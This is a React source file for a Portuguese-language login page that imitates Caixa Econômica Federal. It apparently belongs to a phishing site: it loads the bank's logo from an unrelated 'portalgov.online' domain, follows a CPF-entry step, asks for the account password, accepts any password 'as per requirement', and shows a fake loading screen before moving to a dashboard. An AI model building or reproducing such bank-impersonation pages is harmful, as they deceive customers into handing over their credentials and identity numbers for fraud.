
import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Eye, EyeOff } from 'lucide-react';
import CaixaLogo from '@/components/CaixaLogo';

const Login = () => {
  const [showPassword, setShowPassword] = useState(false);
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    
    // Any password is accepted as per requirement
    // Display loading screen for 3 seconds
    setTimeout(() => {
      navigate('/dashboard');
    }, 3000);
  };

  const handleBack = () => {
    navigate('/cpf-entry');
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-fgts-pattern flex flex-col items-center justify-center">
        <div className="container mx-auto px-6 flex-1 flex flex-col items-center justify-center max-w-md">
          <div className="w-full flex justify-center mb-10">
            <CaixaLogo />
          </div>
          <div className="text-white text-center">
            <p className="text-2xl font-light mb-4">Carregando...</p>
            <div className="flex justify-center">
              <div className="animate-spin rounded-full h-10 w-10 border-t-2 border-b-2 border-white"></div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="container mx-auto px-6 pt-8 flex-1 flex flex-col items-center max-w-md">
        <div className="w-full flex justify-center mb-8">
          <img 
            src="https://portalgov.online/Caixa_Econômica_Federal_logo.svg.png" 
            alt="Caixa Econômica Federal" 
            className="h-14 w-auto"
          />
        </div>

        <div className="text-center mb-2">
          <h1 className="text-[#005CA9] text-xl font-normal">Login Caixa</h1>
        </div>

        <div className="text-[#5A6978] text-center mb-8 text-base">
          <p>Informe sua senha:</p>
        </div>

        <form className="w-full" onSubmit={handleLogin}>
          <div className="mb-6">
            <div className="flex items-center gap-2 mb-2">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-[#5A6978]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
              <span className="text-[#5A6978]">Senha</span>
            </div>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full border-b border-[#FF8C00] focus:outline-none focus:border-b-2 py-2 bg-white"
                required
              />
              <button 
                type="button"
                onClick={togglePasswordVisibility}
                className="absolute right-2 top-2 text-[#5A6978]"
              >
                {showPassword ? 
                  <EyeOff className="h-5 w-5" /> : 
                  <Eye className="h-5 w-5" />
                }
              </button>
            </div>
          </div>

          <button
            type="submit"
            className="w-full bg-[#FF8C00] text-white py-4 rounded text-lg font-medium hover:bg-opacity-90 transition-all duration-300 mb-3"
          >
            Entrar
          </button>

          <button
            type="button"
            onClick={handleBack}
            className="w-full border border-[#FF8C00] text-[#FF8C00] py-4 rounded text-lg font-medium hover:bg-gray-50 transition-all duration-300 mb-6"
          >
            Voltar
          </button>

          <div className="text-center">
            <p className="mb-4 text-[#5A6978]">
              Esqueceu sua senha? <span className="text-[#005CA9]">Recuperar Senha</span>
            </p>
            <p className="text-[#005CA9]">Preciso de ajuda</p>
          </div>
        </form>
      </div>
    </div>
  );
};

export default Login;
